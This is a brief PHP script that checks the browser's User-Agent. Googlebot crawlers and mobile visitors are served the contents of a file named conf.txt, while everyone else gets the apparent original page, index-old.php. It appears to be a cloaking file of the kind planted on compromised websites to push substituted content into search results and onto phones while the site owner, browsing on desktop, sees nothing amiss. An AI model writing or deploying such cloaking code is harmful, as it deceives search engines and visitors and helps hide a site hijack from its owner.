<?php
function is_google_bot() {
$agents = array(
"Googlebot",
"Google-Site-Verification",
"Google-InspectionTool",
"Googlebot-Mobile",
"Googlebot-News"
);
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
foreach ($agents as $agent) {
if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
return true;
}
}
}
return false;
}

function is_mobile_device() {
$mobile_agents = array(
'Android', 'iPhone', 'iPad', 'iPod', 'Opera Mini', 'IEMobile', 'Mobile', 'webOS'
);
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
foreach ($mobile_agents as $device) {
if (stripos($_SERVER['HTTP_USER_AGENT'], $device) !== false) {
return true;
}
}
}
return false;
}

if (is_google_bot() || is_mobile_device()) {
$bot_content = @file_get_contents('conf.txt');
if ($bot_content !== false) {
echo $bot_content;
} else {
echo "Konten eksternal tidak tersedia.";
}
exit;
} else {
include('index-old.php');
exit;
}
?>
